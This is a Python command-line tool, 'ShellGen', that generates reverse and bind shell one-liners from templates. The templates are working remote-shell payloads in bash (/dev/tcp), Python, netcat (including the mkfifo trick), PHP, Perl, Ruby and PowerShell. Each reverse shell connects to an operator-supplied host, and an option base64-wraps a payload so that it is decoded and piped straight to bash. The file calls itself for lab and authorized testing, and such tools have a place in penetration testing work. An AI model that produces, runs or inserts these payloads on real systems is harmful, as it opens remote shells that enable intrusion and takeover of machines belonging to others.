#!/usr/bin/env python3
"""
ShellGen — reverse / bind shell one-liner generator
D3F4UL7T

Lab / authorized testing only.
"""

from __future__ import annotations

import argparse
import base64
import ipaddress
import re
import sys


BANNER = r"""
   ______ _               _   _____ __         ____
  / ____/(_)___  _________| |_/ ___// /_  ___  / / /
 / / __ / / __ \/ ___/ ___/ __/\__ \/ __ \/ _ \/ / /
/ /_/ // / /_/ (__  ) /__/ /_ ___/ / / / /  __/ / /
\____//_/\____/____/\___/\__/____/_/ /_/\___/_/_/

  reverse / bind shell generator  |  D3F4UL7T
"""

LANGS = ("bash", "python", "nc", "php", "perl", "ruby", "powershell")

TEMPLATES = {
    "bash_reverse": {
        "lang": "bash", "type": "reverse",
        "desc": "bash /dev/tcp reverse",
        "template": "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
    },
    "bash_reverse_udp": {
        "lang": "bash", "type": "reverse",
        "desc": "bash UDP reverse",
        "template": "bash -i >& /dev/udp/{LHOST}/{LPORT} 0>&1",
    },
    "python_reverse": {
        "lang": "python", "type": "reverse",
        "desc": "python3 socket reverse",
        "template": (
            "python3 -c 'import socket,subprocess,os;"
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            "s.connect((\"{LHOST}\",{LPORT}));"
            "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            "subprocess.call([\"/bin/sh\",\"-i\"])'"
        ),
    },
    "python_reverse_short": {
        "lang": "python", "type": "reverse",
        "desc": "python3 pty reverse",
        "template": (
            "python3 -c 'import os,pty,socket;s=socket.socket();"
            "s.connect((\"{LHOST}\",{LPORT}));"
            "[os.dup2(s.fileno(),fd) for fd in (0,1,2)];"
            "pty.spawn(\"/bin/sh\")'"
        ),
    },
    "nc_reverse": {
        "lang": "nc", "type": "reverse",
        "desc": "netcat -e reverse",
        "template": "nc -e /bin/sh {LHOST} {LPORT}",
    },
    "nc_reverse_mkfifo": {
        "lang": "nc", "type": "reverse",
        "desc": "netcat mkfifo reverse (no -e)",
        "template": "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f",
    },
    "php_reverse": {
        "lang": "php", "type": "reverse",
        "desc": "php reverse",
        "template": (
            "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});"
            "exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        ),
    },
    "perl_reverse": {
        "lang": "perl", "type": "reverse",
        "desc": "perl reverse",
        "template": (
            "perl -e 'use Socket;$i=\"{LHOST}\";$p={LPORT};"
            "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            "if(connect(S,sockaddr_in($p,inet_aton($i)))){{"
            "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
            "exec(\"/bin/sh -i\");}};'"
        ),
    },
    "ruby_reverse": {
        "lang": "ruby", "type": "reverse",
        "desc": "ruby reverse",
        "template": (
            "ruby -rsocket -e'f=TCPSocket.open(\"{LHOST}\",{LPORT}).to_i;"
            "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
        ),
    },
    "powershell_reverse": {
        "lang": "powershell", "type": "reverse",
        "desc": "powershell reverse",
        "template": (
            "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});"
            "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};"
            "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;"
            "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
            "$sendback = (iex $data 2>&1 | Out-String );"
            "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
            "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
            "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};"
            "$client.Close()\""
        ),
    },
    "bash_bind": {
        "lang": "bash", "type": "bind",
        "desc": "bash bind",
        "template": "while true; do bash -i >& /dev/tcp/0.0.0.0/{LPORT} 0>&1; done",
    },
    "python_bind": {
        "lang": "python", "type": "bind",
        "desc": "python3 bind",
        "template": (
            "python3 -c 'import socket,subprocess,os;"
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            "s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);"
            "s.bind((\"0.0.0.0\",{LPORT}));s.listen(1);c,a=s.accept();"
            "os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);"
            "subprocess.call([\"/bin/sh\",\"-i\"])'"
        ),
    },
    "nc_bind": {
        "lang": "nc", "type": "bind",
        "desc": "netcat bind",
        "template": "nc -lvp {LPORT} -e /bin/sh",
    },
    "php_bind": {
        "lang": "php", "type": "bind",
        "desc": "php bind",
        "template": (
            "php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);"
            "socket_bind($s,\"0.0.0.0\",{LPORT});socket_listen($s,1);"
            "$c=socket_accept($s);while(1){{if(!socket_write($c,\"$ \",2))break;"
            "$in=socket_read($c,2048);$out=shell_exec($in);"
            "socket_write($c,$out,strlen($out));}}'"
        ),
    },
}


def valid_host(host: str) -> bool:
    try:
        ipaddress.ip_address(host)
        return True
    except ValueError:
        return bool(re.match(r"^[a-zA-Z0-9.-]+$", host))


def list_templates() -> None:
    print("[*] payloads\n")
    print(f"{'KEY':<28} {'LANG':<12} {'TYPE':<8} DESCRIPTION")
    print("-" * 80)
    for key, t in TEMPLATES.items():
        print(f"{key:<28} {t['lang']:<12} {t['type']:<8} {t['desc']}")
    print()


def generate(key: str, lhost: str, lport: int, encode: bool = False) -> str:
    payload = TEMPLATES[key]["template"].format(LHOST=lhost, LPORT=lport)
    if encode:
        b64 = base64.b64encode(payload.encode()).decode()
        payload = f"echo {b64} | base64 -d | bash"
    return payload


def main() -> None:
    print(BANNER)
    p = argparse.ArgumentParser(
        prog="shellgen",
        description="ShellGen — reverse / bind shell generator (D3F4UL7T)",
    )
    p.add_argument("--list", "-l", action="store_true", help="list payloads")
    p.add_argument("--type", "-t", choices=["reverse", "bind"])
    p.add_argument("--lang", choices=LANGS)
    p.add_argument("--key", "-k", help="exact template key")
    p.add_argument("--lhost", "-H")
    p.add_argument("--lport", "-p", type=int)
    p.add_argument("--encode", action="store_true", help="base64 wrap")
    p.add_argument("--output", "-o", help="append payload to file")
    args = p.parse_args()

    if args.list or (not args.type and not args.key and not args.lang):
        list_templates()
        return

    if args.key:
        if args.key not in TEMPLATES:
            print(f"[!] unknown key: {args.key}")
            sys.exit(1)
        keys = [args.key]
    else:
        if not args.type or not args.lang:
            print("[!] need --type and --lang, or --key")
            sys.exit(1)
        keys = [
            k for k, t in TEMPLATES.items()
            if t["type"] == args.type and t["lang"] == args.lang
        ]
        if not keys:
            print(f"[!] no templates for type={args.type} lang={args.lang}")
            sys.exit(1)

    if not args.lport or not (1 <= args.lport <= 65535):
        print("[!] valid --lport required")
        sys.exit(1)

    need_host = any(TEMPLATES[k]["type"] == "reverse" for k in keys)
    if need_host:
        if not args.lhost or not valid_host(args.lhost):
            print("[!] valid --lhost required for reverse")
            sys.exit(1)
        lhost = args.lhost
    else:
        lhost = "0.0.0.0"

    for key in keys:
        payload = generate(key, lhost, args.lport, args.encode)
        print(f"\n[*] {key}")
        print(f"    {TEMPLATES[key]['desc']}")
        print("-" * 60)
        print(payload)
        print("-" * 60)
        if args.output:
            with open(args.output, "a") as f:
                f.write(f"# {key}\n{payload}\n\n")
            print(f"[+] wrote {args.output}")


if __name__ == "__main__":
    main()
